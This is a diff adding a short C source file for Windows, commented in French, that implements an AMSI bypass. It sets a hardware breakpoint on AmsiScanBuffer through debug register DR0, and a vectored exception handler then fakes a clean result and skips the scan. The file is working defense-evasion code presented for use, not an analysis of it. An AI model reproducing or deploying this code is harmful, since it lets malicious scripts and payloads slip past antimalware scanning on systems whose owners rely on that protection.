@@ -1,0 +1,39 @@
+﻿#include <windows.h>
+#include <stdio.h>
+#include <winternl.h>
+#include "hardwareBreakpoint.h"
+
+LONG WINAPI VEH_Handler(EXCEPTION_POINTERS* pExInfo) {
+    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        // C'est notre breakpoint DR0 qui a tiré
+        // Vérifie si l'exception provient précisément de l'entrée de la fonction
+        // AmsiScanBuffer. pAmsiScanBuffer contient l'adresse connue de la
+        // fonction AMSI que l'on souhaite intercepter. On compare le RIP courant
+        // (adresse de l'instruction suivante) avec cette adresse pour s'assurer
+        // qu'il s'agit bien de l'appel ciblé.
+        if (pExInfo->ContextRecord->Rip == (DWORD64)pAmsiScanBuffer) {
+            // AmsiScanBuffer retourne HRESULT
+            // On met AMSI_RESULT_CLEAN (0) dans le registre de retour
+            // et on skip la fonction entière
+            pExInfo->ContextRecord->Rax = S_OK;          // return value = 0
+            pExInfo->ContextRecord->Rip =                // skip vers l'adresse de retour
+                *(ULONG_PTR*)pExInfo->ContextRecord->Rsp;
+            pExInfo->ContextRecord->Rsp += 8;            // pop le return address
+
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+void SetDR0Breakpoint(PVOID address) {
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    GetThreadContext(GetCurrentThread(), &ctx);
+
+    ctx.Dr0 = (DWORD64)address;   // adresse du breakpoint
+    ctx.Dr7 |= (1 << 0);          // active DR0 (bit 0 de DR7)
+
+    SetThreadContext(GetCurrentThread(), &ctx);
+}
